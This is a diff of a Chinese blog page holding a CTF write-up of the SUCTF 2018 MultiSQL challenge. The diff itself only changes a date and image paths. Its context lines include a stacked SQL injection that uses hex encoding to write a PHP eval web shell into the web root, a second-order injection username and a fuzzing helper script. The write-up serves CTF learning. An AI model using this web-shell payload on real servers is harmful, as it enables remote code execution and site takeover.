@@ -579,7 +579,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-24
+                    2022-01-28
                 </div>
                 
 
@@ -612,12 +612,12 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[sql读文件|outfile|load_file]</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821131531758.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821131531758.png"></p>
 <h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>注册个账号，发现?id=2</p>
 <p>试了下异或，可行</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821132717828.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821132717828.png"></p>
 <p>尝试了很久，过滤了很多东西，substr被过滤了，不过mid还可以。</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821133645237.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821133645237.png"></p>
 <p>数据库用户suctf@localhost</p>
 <h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>测试了下select 123，没反应，还以为不能堆叠注入。</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> hex<span class="token punctuation">(</span><span class="token string">'select 123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//73656C65637420313233</span>
@@ -636,7 +636,7 @@
 </li>
 </ul>
 <p>先查下这个函数为/var/www/，所以是可以直接写入shell的。</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821155311899.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821155311899.png"></p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> hex<span class="token punctuation">(</span><span class="token string">"select '&lt;?php eval($_POST[cmd]);?>' into outfile '/var/www/html/favicon/shell.php';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <pre class="line-numbers language-none"><code class="language-none">73656C65637420273C3F706870206576616C28245F504F53545B636D645D293B3F3E2720696E746F206F757466696C6520272F7661722F7777772F68746D6C2F66617669636F6E2F7368656C6C2E706870273B<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -682,7 +682,7 @@ url <span class="token operator">=</span> <span class="token string">'http://733
 
 <p>题目名是MultiSQL，试试二次注入</p>
 <p>注册用户名为<code>1&#39;and 0</code></p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821135214740.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821135214740.png"></p>
 <p>写个代码，方便看回显</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
 <span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree
@@ -699,9 +699,9 @@ name <span class="token operator">=</span> html<span class="token punctuation">.
 <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>单引号双引号会加反斜杠，过滤的字符会变成@@</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821141202344.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821141202344.png"></p>
 <p>还是老规矩，fuzz一下吧</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821144946867.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821144946867.png"></p>
 <p>不过这意义也不大，毕竟flag不在数据库里。就这样吧。</p>
 
                 
